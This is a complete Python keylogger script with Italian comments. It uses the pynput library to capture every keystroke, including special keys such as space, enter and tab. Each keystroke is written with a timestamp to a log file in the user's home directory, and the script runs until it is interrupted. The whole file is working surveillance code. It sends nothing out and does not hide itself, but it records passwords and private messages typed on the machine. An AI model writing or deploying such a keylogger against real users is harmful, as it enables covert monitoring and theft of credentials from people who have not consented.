from pynput import keyboard
import logging
import sys
import os

# Configurazione
file_log = os.path.join(os.path.expanduser("~"), "keyloggeroutput.txt")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
        }
        logging.info(special_keys.get(key, f"[{key}]"))

def setup_logging():
    logging.basicConfig(
        filename=file_log,
        level=logging.DEBUG,
        format='%(asctime)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

def main():
    setup_logging()
    logging.info("Keylogger started")
    
    # Avvia il listener
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            logging.info("Keylogger stopped by user")
        except Exception as e:
            logging.error(f"Error: {str(e)}")

if __name__ == "__main__":
    main()